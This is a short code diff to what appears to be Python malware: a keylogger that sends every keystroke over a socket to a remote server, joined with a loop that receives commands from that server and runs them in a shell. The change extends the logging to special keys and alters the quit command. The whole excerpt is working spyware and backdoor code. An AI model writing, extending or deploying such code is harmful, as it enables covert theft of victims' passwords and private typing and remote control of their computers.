@@ -11,8 +11,7 @@ def start_keylogger(cs):
         try:
             cs.send(f"{key.char}".encode())
         except AttributeError:
-            cs.send("")
-            #cs.send(f"[{key}]".encode())
+            cs.send(f"[{key}]".encode())
 
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
@@ -26,7 +25,7 @@ def connect_to_server():
     while True:
         try:
             command = cs.recv(1024).decode()
-            if command.lower() == 'quit':
+            if command.lower() == 'exit':
                 break
             else:
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
